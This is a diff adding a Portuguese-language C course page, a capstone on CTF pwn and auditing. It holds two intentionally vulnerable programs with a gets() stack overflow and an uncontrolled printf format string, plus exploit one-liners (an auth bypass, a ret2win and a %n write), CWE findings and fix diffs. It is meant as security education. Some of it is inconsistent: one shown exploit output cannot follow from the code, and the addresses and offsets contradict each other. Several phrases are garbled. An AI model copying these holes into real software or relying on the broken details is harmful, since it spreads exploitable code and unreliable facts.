@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>4.10 — Capstone: CTF pwn + auditoria definitiva — Aprenda C</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body data-trilha="4">
+<header class="site-header">
+  <a class="brand" href="../index.html">⌘ Aprenda <b>C</b></a>
+  <nav class="top-nav">
+    <a href="../index.html">Roadmap</a>
+    <a href="../exercicios/index.html">Exercícios</a>
+    <a href="../projetos/index.html">Projetos</a>
+  </nav>
+</header>
+<main class="modulo">
+  <nav class="breadcrumb"><a href="../index.html">Roadmap</a> / <a href="../index.html#t4">Trilha 4 — Cyber</a> / Capstone: CTF pwn + auditoria definitiva</nav>
+
+  <header class="mod-header">
+    <div class="mod-cab NUM">4.10</div>
+    <h1>Capstone: CTF pwn + auditoria definitiva</h1>
+    <p class="subtitulo">Explorar dois binários de CTF e auditar/corrigir código C real</p>
+    <div class="chips">
+      <span class="chip">Nível: Avançado/Cyber</span>
+      <span class="chip">Duração: ~50 min</span>
+      <span class="chip">Pré-requisitos: T4.04–T4.09 (ferramentas, overflow, mitigações, format string, heap, redes)</span>
+    </div>
+    <button class="btn btn-done" data-mod="t4-m10">Marcar concluído</button>
+  </header>
+
+  <section class="card objetivos">
+    <h2>🎯 Objetivos</h2>
+    <p>Prova final da trilha em dois braços: (1) OFENSIVO — resolver dois desafios de pwn em plataformas éticas (pwn.college "Shellcode Injection" ou Exploit Education "Phoenix stack-series"), escrevendo exploit e um writeup em markdown; (2) DEFENSIVO — auditar dois programas C fornecidos (ctf1.c e ctf2.c), identificar 3+ vulnerabilidades com CWE, linha, impacto e explotabilidade, e propor correções com diff.</p>
+  </section>
+
+  <section class="card leitura">
+  <h2>📖 Leitura guiada</h2>
+  
+  
+  <p class="foco"><strong>Foco da leitura:</strong> Use o pwn.college (https://pwn.college/) módulos de programmability/shellcode e o Exploit Education (https://exploit.education/) — série Phoenix (stack-series). Reforce com vídeos do LiveOverflow ("Buffer overflow exploits" e "Format string") e, para a parte defensiva, use o CWE Top 25 (https://cwe.mitre.org/data/definitions/934.html) como checklist na hora de classificar os achados.</p>
+</section>
+  <section class="card secao">
+  <h2>A missão, em mapas de duas estradas</h2>
+  <p>Este é o módulo em que tudo converge. Você vai (1) resolver <strong>dois binários reais de CTF</strong> das plataformas éticas indicadas — explorando de verdade, mas dentro do sandbox deles; e (2) auditar <strong>dois binários que eu forneço</strong> (ctf1.c e ctf2.c), encontrando as vulnerabilidades com o vocabulário CWE e propondo correção com diff. A entrega: um diretório <code>~/labs/4.10</code> com dois writeups e um relatório de auditoria.</p>
+<p>As plataformas de CTF são espaços <em>projetados</em> para isso: você recebe o binário, o servidor de teste e a permissão escancarada de atacar <em>aquele</em> binário. Nada disso autoriza atacar qualquer outro sistema — a regra ética da trilha continua valendo.</p>
+  
+  
+  
+</section>
+<section class="card secao">
+  <h2>Braço ofensivo: escolha e método</h2>
+  <p>Escolha um dos dois pacotes (não precisa fazer os dois):</p>
+  <ul><li><strong>pwn.college — programmability (shellcode injection)</strong>: programas mínimos que lêem shellcode e o executam — variação pura da ideia do módulo 05, com buffer e exec direto. /esté exatamente o repertório que construímos.</li>
+<li><strong>Exploit Education — Phoenix (stack-series)</strong>: binários com overflow clássico, format string e ret2libc, prontos para rodar localmente no seu lab (os mesmos padrões dos módulos 05-07).</li>
+<li>Regra da prova: resolva <strong>pelo menos 2 binários</strong> de uma das séries. Sugestão de rota: um overflow simples (ex.: stack-zero/one do Phoenix) + um format string ou ret2libc.</li></ul>
+  
+  
+</section>
+<section class="card secao">
+  <h2>A entrega ofensiva: o writeup</h2>
+  <p>Para cada binário resolvido, um arquivo <code>writeup_<challenge>.md</code> com a anatomia de um writeup profissional:</p>
+  <ul><li><strong>Resumo</strong>: o que o binário faz e qual a classe de bug (com CWE).</li>
+<li><strong>Verificação</strong>: <code>checksec</code> transcrito e interpretado (NX/PIE/canário/RELRO).</li>
+<li><strong>Análise</strong>: desenho da frame/vetor (offset, endereços, leak) com evidências do gdb.</li>
+<li><strong>Exploit</strong>: o payload completo (ou script) e os comandos de execução.</li>
+<li><strong>Prova</strong>: output com a flag/cat do arquivo de flag (nas plataformas) ou shell obtida.</li>
+<li><strong>Defesa</strong>: como você corrigiria aquele bug e quais mitigações faltavam.</li></ul>
+  
+  
+</section>
+<section class="card secao">
+  <h2>Braço defensivo: o método de auditoria</h2>
+  <p>Antes de ler os binários, o método que você vai aplicar (e repetir na vida real):</p>
+  <ul><li>1. <strong>Inventário de entrada</strong>: liste todos os pontos onde o programa lê dados externos (argv, stdin, arquivo, rede) — é onde bugs vivem.</li>
+<li>2. <strong>Caça de copy/format</strong>: procure gets, strcpy, strcat, sprintf, printf(var).</li>
+<li>3. <strong>Caça de aritmética</strong>: tamanhos, índices, subtrações unsigned, off-by-one.</li>
+<li>4. <strong>Caça de vida/morte</strong>: malloc/free pareados? ponteiro reaproveitado?</li>
+<li>5. <strong>Confirmar com ferramentas</strong>: compilar com sanitizers/valgrind e reproduzir.</li>
+<li>6. <strong>Registrar</strong>: cada achado com (a) CWE, (b) linha, (c) impacto, (d) explotabilidade (trivial/média/baixa) e (e) correção proposta.</li></ul>
+  
+  
+</section>
+<section class="card secao">
+  <h2>Binário 1 da auditoria: ctf1.c</h2>
+  <p>Um "terminal"zinho de senha — três vulnerabilidades da nossa trilha num só arquivo. Compile-o e explore você mesmo antes de ver o gabarito.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — ctf1.c (VULNERÁVEL)</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">/* ctf1.c -- binario didatico de auditoria (VULNERAVEL).
+   Compile NO LINUX/WSL (didatico): 
+   gcc -m32 -fno-stack-protector -no-pie -g ctf1.c -o ctf1
+   OBS.: em 64-bit (-m64) os offsets mudam; o texto do gabarito
+   usa 32-bit. Numeros nao chutados: meca no seu gdb. */
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define SENHA &quot;br1ck3d??&quot;
+
+static void painel_admin(void)
+{
+    printf(&quot;FLAG_EDUCACIONAL{nunca-deploye-isto}\n&quot;);
+    system(&quot;/bin/sh&quot;);
+}
+
+int main(void)
+{
+    char senha[32];
+    int  permitido = 0;
+
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf(&quot;== terminal ctf1 ==\nsenha: &quot;);
+    gets(senha);                   /* &lt;-- 1a vunerabilidade */
+
+    if (strcmp(senha, SENHA) == 0)
+        permitido = 1;
+
+    if (permitido)
+        printf(&quot;acesso concedido\n&quot;);
+    else
+        printf(&quot;negado\n&quot;);
+    return 0;
+}</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ gcc -m32 -fno-stack-protector -no-pie -g ctf1.c -o ctf1
+$ ./ctf1
+== terminal ctf1 ==
+senha: hehe
+negado</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>Binário 2 da auditoria: ctf2.c</h2>
+  <p>Um "registrador de eventos" com duas fraquezas da trilha. Reproduza o comportamento bugado antes do gabarito.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — ctf2.c (VULNERÁVEL)</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">/* ctf2.c -- binario didatico de auditoria (VULNERAVEL).
+   Compile NO LINUX/WSL (didatico):
+   gcc -m32 -fno-stack-protector -no-pie -g ctf2.c -o ctf2 */
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int nivel = 0;   /* nivel de seguranca global */
+
+int main(void)
+{
+    char evento[512];
+
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf(&quot;== terminal ctf2 ==\ndigite a descricao do evento: &quot;);
+    if (fgets(evento, sizeof evento, stdin) == NULL)
+        return 1;
+
+    printf(&quot;[log] &quot;);
+    printf(evento);                  /* &lt;-- vunerabilidade central */
+
+    printf(&quot;nivel de seguranca: %s\n&quot;,
+           nivel == 0 ? &quot;baixo&quot; : &quot;ELEVADO&quot;);
+    return 0;
+}</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ gcc -m32 -fno-stack-protector -no-pie -g ctf2.c -o ctf2
+$ ./ctf2
+== terminal ctf2 ==
+digite a descricao do evento: tentativa de login
+[log] tentativa de login
+nivel de seguranca: baixo</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>Gabarito ctf1.c: os achados</h2>
+  <p>Tabela do que o auditor (você) deve ter achado; reproduza as provas no lab antes de seguir.</p>
+  <ul><li><strong>CWE-242 (Uso de função inerentemente perigosa) / CWE-121 (stack overflow)</strong> — linha do <code>gets(senha)</code>. Entrada sem limite estoura <code>senha[32]</code>. Impacto: RCE (com a cadeia completa) ou corrupção. Explotabilidade: triviale.</li>
+<li><strong>CWE-287 (Autenticação imprópria)</strong> — o <em>bypass</em>: com 33 bytes (32 de senha + 1 byte <code>1</code>), o <code>permitido</code> — que vive junto na frame — vira não-zero; o <code>if (permitido)</code> concede independentemente da senha. Distinct do overflow do item anterior (duas CWEs para o mesmo gets).</li>
+<li><strong>CWE-119 (Falha de limites de memória)</strong> — pai das duas acima (o vetor em si). Se preferir manter, classifique como CWE-119 + CWE-121 + CWE-287.</li>
+<li><strong>Bônus (ret2win)</strong>: com offset 36 no 32-bit (32 de buffer + 4 do EBP), o payload pode retornar direto para <code>painel_admin</code> — transformando o bug de leitura de flash em código. Prova no gdb.</li></ul>
+  <div class="code-block">
+  <div class="code-head"><span>Código — gabarito ctf1</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c"># prova 1: bypass por estouro do permitido (32-bit)
+$ python3 -c &quot;print('A'*32 + '\x01')&quot; | ./ctf1
+...
+== terminal ctf1 ==
+senha: acesso concedido
+FLAG_EDUCACIONAL{nunca-deploye-isto}
+$ 
+
+# prova 2: ret2win (32-bit) - endereco de painel_admin
+$ objdump -t ctf1 | grep painel_admin
+000010d0 g F .text  000...           painel_admin
+$ python3 -c &quot;import struct,sys;
+e=0x4010d0  # se o binario for -no-pie
+sys.stdout.buffer.write(b'A'*36 + struct.pack('&lt;I', e))&quot; | ./ctf1</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>Correções ctf1.c (com diff)</h2>
+  
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — correcao ctf1</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">--- ctf1.c (vulneravel)
++++ ctf1.c (corrigido)
+@@ main:
+-    char senha[32];
+-    int  permitido = 0;
++    char senha[64];
++    int  autenticado = 0;
+@@ leitura:
+-    gets(senha);                          /* CWE-242/121 */
++    if (fgets(senha, sizeof senha, stdin) == NULL)
++        return 1;                         /* nunca confie em gets */
++    senha[strcspn(senha, &quot;\n&quot;)] = '\0';  /* limpa o \n final */
+@@ decisao:
+-    if (strcmp(senha, SENHA) == 0)
+-        permitido = 1;
+-    if (permitido)
+-        printf(&quot;acesso concedido\n&quot;);
+-    else
+-        printf(&quot;negado\n&quot;);
++    if (strcmp(senha, SENHA) == 0)
++        autenticado = 1;
++    if (autenticado)
++        printf(&quot;acesso concedido\n&quot;);
++    else
++        printf(&quot;negado\n&quot;);
+@@ simplificar / reduzir superficie:
+-    system(&quot;/bin/sh&quot;);     /* num app real: NAO existe shell sob demanda */
+@@ build:
+-    gcc -m32 -fno-stack-protector -no-pie ...
++    gcc -O2 -Wall -Wextra -Wformat-security -Werror=format-security \
++        -fstack-protector-all -pie -z relro -z now ctf1.c -o ctf1_hard</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>Gabarito ctf2.c: os achados</h2>
+  
+  <ul><li><strong>CWE-134 (Uncontrolled format string)</strong> — <code>printf(evento)</code>: a entrada vira format; <code>%p/%x</code> vazam pilha/registradores (leak) — o mesmo vetor que alimenta ret2libc do módulo 06.</li>
+<li><strong>CWE-119/CWE-787 (escrita fora dos limites real)</strong> — via <code>%n</code>: escrever no endereço de <code>nivel</code> (global, endereço fixo em -no-pie) e elevar o nível de segurança sem privilégio. A lógica "nivel != 0 → ELEVADO" é a fraqueza de confiança.</li>
+<li><strong>Leak de fingerprint</strong>: o formato livre permite vazar endereços da libc/PIE — informação que (combinada ao overflow em outra parte do sistema) vira exploit completo.</li></ul>
+  <div class="code-block">
+  <div class="code-head"><span>Código — gabarito ctf2</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c"># prova (32-bit, -no-pie: endereco de nivel e fixo)
+$ nm ctf2 | grep ' nivel'
+0804a024 B nivel
+$ python3 -c 'import struct,sys
+addr=0x0804a024
+p=struct.pack(&quot;&lt;I&quot;, addr) + b&quot;%20u&quot; + b&quot;%5$n&quot;
+sys.stdout.buffer.write(p)' | ./ctf2
+== terminal ctf2 ==
+digite a descricao do evento: [log] &lt;20 espacos&gt;
+nivel de seguranca: ELEVADO   # o %n gravou 20+n0 no endereco de nivel</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>Correções ctf2.c (com diff)</h2>
+  
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — correcao ctf2</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">--- ctf2.c (vulneravel)
++++ ctf2.c (corrigido)
+@@ output:
+-    printf(evento);                      /* CWE-134 */
++    printf(&quot;%s&quot;, evento);                /* format explicita, sempre  */
+@@ estado:
+-    int nivel = 0;   /* global: alvo de escrita */
+-    if (nivel == 0) printf(&quot;nivel: baixo\n&quot;); else printf(&quot;nivel: ELEVADO\n&quot;);
++    int nivel = verifica_status();
++    printf(&quot;nivel de seguranca: %s\n&quot;, nivel ? &quot;ok&quot; : &quot;baixo&quot;);
++    /* nada de &quot;escreva num global e vire admin&quot; */
+@@ campo minimo da entrada:
+-    char evento[512];
++    char evento[256];   /* menor; e mesmo assim so com %s */
+@@ build:
++    gcc -O2 -Wall -Wextra -Wformat-security -Werror=format-security \
++        -fstack-protector-all -pie -z relro -z now ctf2.c -o ctf2_hard</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>Como se defender (checklist final da auditoria)</h2>
+  
+  <ul><li>Leia o código procurando ENTRADA, CÓPIA, FORMAT e ESTADO — não linha por linha: primeiro o mapa dos pontos que recebem dados externos.</li>
+<li>Classe as fraquezas com CWE (é o idioma que engenheiros, GTDs e bots de segurança entendem) e grave linha + impacto + explotabilidade.</li>
+<li>Reproduza SEMPRE: um bug que não se reproduz em teste não pode ser classificado como "corrigido". Sanitizers e valgrind são o instrumento (rodando no CI).</li>
+<li>Aplique o combo de mitigação em qualquer build (canário, NX, PIE, FULL RELRO, FORTIFY, format-security) e confirme com checksec.</li>
+<li>Reduza superfície: menos shell, menos sistemas(), menos globais, menos campos de entrada.</li>
+<li>Documente: writeup + diff em git review, para que o (próximo) humano entenda o "porquê" além do "o quê".</li>
+<li>Se você encontrar um bug em código alheio/produção: pare, reporte ao responsável com proposta de correção, não prove nada contra outros sistemas.</li></ul>
+  
+  
+</section>
+  <section class="card exs"><h2>✏️ Exercícios</h2><div class="exercicio" id="ex-1" data-mod="t4-m10">
+  <div class="ex-head">
+    <span class="badge badge-nivel n3">Nível 3</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.10.1</p>
+  <p class="enunciado">Sem olhar o gabarito: reproduza o bypass de autenticação do ctf1.c (32-bit) gravando o byte 1 no local "permitido", e depois o ret2win saltando para painel_admin. Anote endereços e offsets SUAS.</p>
+  <p class="dica"><strong>Dica:</strong> Primeiro meça onde fica permitido em relação a senha (gdb: p &senha, p &permitido). O ret2win: offset = espaco_de_senha + 4 (saved ebp).</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">$ gdb ./ctf1
+(gdb) break 18
+(gdb) run
+(gdb) p &amp;senha
+$1 = (char (*)[32]) 0xbfffefac
+(gdb) p &amp;permitido
+$2 = (int *) 0xbffff01c   # permitido logo apos senha
+(gdb) quit
+$ python3 -c &quot;print('A'*32 + '\x01')&quot; | ./ctf1
+senha: acesso concedido</code></pre>
+        <p class="obs">Layout real da frame confirmado no gdb — e por isso "33 bytes" muda a leitura do programa: perceba que strcmp compara a FONTE estourada...</p></details>
+</div>
+<div class="exercicio" id="ex-2" data-mod="t4-m10">
+  <div class="ex-head">
+    <span class="badge badge-nivel n3">Nível 3</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.10.2</p>
+  <p class="enunciado">No ctf2.c, descubra o endereço da global <code>nivel</code> com <code>nm</code>, monte o payload %n que grava um valor pequeno (ex.: %5$n ou %6$n — encontre o índice do seu buffer) e eleve o nível. Depois repita com um offset errado e explique por que o programa sai com SIGSEGV.</p>
+  <p class="dica"><strong>Dica:</strong> Como em 4.07, o índice do seu buffer no 32-bit se descobre com uma varredura de %N$p.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">$ nm ctf2 | grep ' nivel'
+0804a024 B nivel
+$ python3 -c 'import struct,sys
+sys.stdout.buffer.write(struct.pack(&quot;&lt;I&quot;,0x0804a024)+b&quot;%6$n&quot;)' | ./ctf2 || true
+# se nao alterar, redescubra o indice do buffer (4.07, exercicio 1)
+# e troque %6$n pelo indice certo. Ao acertar --&gt;
+# nivel de seguranca: ELEVADO</code></pre>
+        <p class="obs">Obs.: em bash POSIX o escape \$ dentro de aspas duplas é literal; no exercício use aspas simples (como no gabarito) e n-uplo ação de teste.</p></details>
+</div>
+<div class="exercicio" id="ex-3" data-mod="t4-m10">
+  <div class="ex-head">
+    <span class="badge badge-nivel n3">Nível 3</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.10.3</p>
+  <p class="enunciado">Complete a auditoria defensiva: além das fraquezas do gabarito, encontre pelo menos 1 achado NÃO listado em cada binário (ex.: em ctf1, o system() num app; em ctf2, ausência de sprint/relatro, compilação sem proteções). Monte a tabela com CWE//linha/impacto/explotabilidade/correção.</p>
+  <p class="dica"><strong>Dica:</strong> Pense em: (1) menor privilégio, (2) estado global compartilhado, (3) falta de logging confiável, (4) retorno não verificado.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">/* exemplos de achados extras plausiveis */
+
+ctf1:
+- CWE-676 (Funcao perigosa): system() chamado com /bin/sh
+  dentro do codigo; impacto = RCE mesmo SEM bug de memoria;
+  explotabilidade: media (depende de alcançar painel_admin);
+  correcao: remover system/exec de um terminal de login.
+- CWE-306 (Controle de acesso ausente): painel_admin acessivel
+  por ret (mesmo corrigido, o ret2func e um vetor classico).
+
+ctf2:
+- CWE-74 (Injecao de conteudo) generalizado: a linha eh &quot;logada&quot;
+  com o conteudo bruto; store com escaping/limites.
+- CWE-693 (Mecanismo de protecao ausente): build sem canario.</code></pre>
+        <p class="obs">A graça da auditoria é achar o que o gabarito não listou — não precisa ser elegante, precisa estar correto.</p></details>
+</div></section>
+  
+<section class="card quiz-card" data-quiz-json='[{&quot;pergunta&quot;:&quot;Quais são as duas notas de entrega do capstone?&quot;,&quot;opcoes&quot;:[&quot;Dois exploits resolvidos em CTF ético com writeup + auditoria de ctf1.c e ctf2.c com CWE/linha/impacto/correção&quot;,&quot;Um vídeo e um slide&quot;,&quot;Um relatório de phishing&quot;,&quot;Um proxy e um script de rede&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Braço ofensivo (exploit + writeup) e braço defensivo (auditoria com CWE e correções) no mesmo diretório.&quot;},{&quot;pergunta&quot;:&quot;No ctf1.c, o bypass \&quot;gravou byte 1 no permitido\&quot; corresponde a qual fraqueza?&quot;,&quot;opcoes&quot;:[&quot;CWE-287 (autenticação imprópria), consequência do CWE-121/gets&quot;,&quot;CWE-476 (NULL pointer dereference)&quot;,&quot;CWE-416 (use-after-free)&quot;,&quot;CWE-134 (format string)&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;O overflow do buffer corrompeu a variável de decisão de autenticação — clássica escalada de escrita em frame.&quot;},{&quot;pergunta&quot;:&quot;No ctf2.c, por que o endereço de &lt;code&gt;nivel&lt;/code&gt; é previsível para o payload %n?&quot;,&quot;opcoes&quot;:[&quot;Porque o binário é -no-pie e a global tem endereço fixo na sessão (esteja ASLR ligado ou não para o binário)&quot;,&quot;Porque o nível é sempre igual a zero&quot;,&quot;Porque é uma variável local&quot;,&quot;Porque o compilador ordena as globals por ordem alfabética&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Globais de binário não-PIE vivem em endereço fixo; com -no-pie o nm mostra o alvo exato.&quot;},{&quot;pergunta&quot;:&quot;O que NÃO faz parte do método de auditoria aplicado no capstone?&quot;,&quot;opcoes&quot;:[&quot;Rodar o exploit contra a plataforma de produção da empresa&quot;,&quot;Inventariar pontos de entrada de dados externos&quot;,&quot;Reproduzir o bug com sanitizers/valgrind antes de classificar&quot;,&quot;Registrar CWE, linha, impacto, explotabilidade e correção&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Auditoria ética reproduz em sandbox/lab próprio; atacar produção sem autorização é ilegal — jamais faz parte do método.&quot;}]'>
+  <h2>❓ Verificação rápida</h2>
+  <div class="quiz-root"></div>
+</section>
+  <section class="card projeto">
+  <h2>🏗️ Miniprojeto: Capstone completo: 2 writeups + 1 relatório de auditoria</h2>
+  <p>Consolide em <code>~/labs/4.10</code>: (1) <code>writeup_challA.md</code> e <code>writeup_challB.md</code> dos dois binários de CTF que você resolveu (checksec, análise, exploit, prova, defesa); (2) <code>auditoria_ctf1.md</code> e <code>auditoria_ctf2.md</code> com a tabela de achados (CWE, linha, impacto, explotabilidade, correção) + diffs aplicados; (3) <code>versao_corrigida_ctf1.c</code> e <code>ctf2.c</code> compilando com o combo defensivo e checksec mostrando as proteções ligadas; (4) um README.md de epílogo com 3 lições pessoais da trilha. Lembre: nada de explorer nada fora do lab.</p>
+  <div class="criterios"><h3>Critérios de aceite</h3><ul><li>2 writeups completos com exploit reproduzível (ou flag capturada nas plataformas).</li><li>2 relatórios de auditoria com no mínimo 3 achados cada (totais) e tabela CWE/linha/impacto/explotabilidade/correção.</li><li>Versões corrigidas compilando com flags defensivas e checksec com NX/PIE/canário/RELRO adequados.</li><li>README final com as 3 lições pessoais.</li><li>Nenhuma evidência de atividade fora do lab (endereços = loopback/plataformas de CTF).</li></ul></div>
+</section>
+  <nav class="mod-nav"><a class="btn nav-prev" href="redes-ofensivas-em-c-shells-shellcode-e-packet-crafting.html">← 4.09 Redes ofensivas em C: shells, shellcode e packet crafting</a></nav>
+  <div class="mod-nav done-nav"><button class="btn btn-done" data-mod="t4-m10">Marcar concluído</button></div>
+</main>
+<footer class="site-footer">
+  <p>Aprenda C — guia progressivo com Beej's Guide, King e conteúdo original.</p>
+</footer>
+<script src="../assets/js/progress.js"></script>
+<script src="../assets/js/highlight.js"></script>
+<script src="../assets/js/quiz.js"></script>
+</body>
+</html>
